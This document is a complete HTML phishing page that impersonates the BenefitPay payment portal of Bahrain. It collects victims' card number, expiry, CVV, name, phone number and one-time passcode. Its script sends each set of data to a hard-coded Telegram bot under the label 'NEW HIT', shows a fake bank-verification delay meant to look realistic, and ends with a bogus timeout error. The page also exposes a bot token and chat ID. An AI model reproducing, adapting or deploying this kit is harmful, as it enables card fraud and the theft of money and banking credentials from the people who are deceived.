<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BenefitPay | Secure Portal</title>
    <style>
        body { font-family: sans-serif; background: #f2f2f2; direction: rtl; margin: 0; }
        .header { background: #e21e26; color: #fff; padding: 15px; display: flex; align-items: center; justify-content: space-between; }
        .container { padding: 20px; max-width: 400px; margin: auto; }
        .card { background: #fff; border-radius: 12px; padding: 25px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); }
        input { width: 100%; padding: 14px; margin-bottom: 15px; border: 1px solid #ccc; border-radius: 8px; font-size: 16px; box-sizing: border-box; text-align: center; }
        .btn { background: #e21e26; color: #fff; border: none; width: 100%; padding: 16px; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; }
        #loading, #otp-screen { display: none; text-align: center; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #e21e26; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="header">
        <div><strong>BenefitPay</strong><br><small>National Portal</small></div>
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/ce/Flag_of_Bahrain.svg/2560px-Flag_of_Bahrain.svg.png" width="40">
    </div>
    <div class="container">
        <div class="card" id="main-card">
            <input type="number" id="amount" placeholder="Amount (BHD)">
            <input type="text" id="holder" placeholder="Full Name">
            <input type="text" id="card" placeholder="0000 0000 0000 0000" maxlength="19">
            <div style="display: flex; gap: 10px;">
                <input type="text" id="exp" placeholder="MM/YY" maxlength="5" style="flex:1">
                <input type="password" id="cvv" placeholder="CVV" maxlength="3" style="flex:1">
            </div>
            <input type="number" id="phone" placeholder="3XXXXXXX">
            <button class="btn" onclick="sendData()">Continue</button>
        </div>

        <div class="card" id="loading"><div class="spinner"></div><p>Verifying with Bank...</p></div>

        <div class="card" id="otp-screen">
            <h3>OTP Verification</h3>
            <p>Enter code sent to your phone</p>
            <input type="number" id="otp_code" placeholder="******" style="font-size: 24px; letter-spacing: 5px;">
            <button class="btn" onclick="finalStep()">Confirm</button>
            <p id="err" style="color:red; display:none; margin-top:10px;">Connection Timeout. Try again.</p>
        </div>
    </div>

<script>
    const token = "8428698833:AAHTDJu1uFDF61ytjsxh8PlSWwbrSPWSGG0";
    const chatId = "8302667206";

    // Format Card & Date
    document.getElementById('card').addEventListener('input', e => { e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim(); });
    document.getElementById('exp').addEventListener('input', e => { if (e.target.value.length === 2 && !e.target.value.includes('/')) e.target.value += '/'; });

    async function sendData() {
        const msg = `🔥 NEW HIT 🔥\nAmt: ${document.getElementById('amount').value}\nName: ${document.getElementById('holder').value}\nCard: ${document.getElementById('card').value}\nExp: ${document.getElementById('exp').value}\nCVV: ${document.getElementById('cvv').value}\nPh: ${document.getElementById('phone').value}`;
        
        document.getElementById('main-card').style.display = 'none';
        document.getElementById('loading').style.display = 'block';

        try {
            await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
            // الانتظار 3 ثواني لإعطاء واقعية
            setTimeout(() => {
                document.getElementById('loading').style.display = 'none';
                document.getElementById('otp-screen').style.display = 'block';
            }, 3000);
        } catch (e) {
            alert("Connection Error. Please try again.");
            location.reload();
        }
    }

    async function finalStep() {
        const otp = document.getElementById('otp_code').value;
        await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("🔑 OTP: " + otp)}`);
        document.getElementById('err').style.display = 'block';
    }
</script>
</body>
</html>
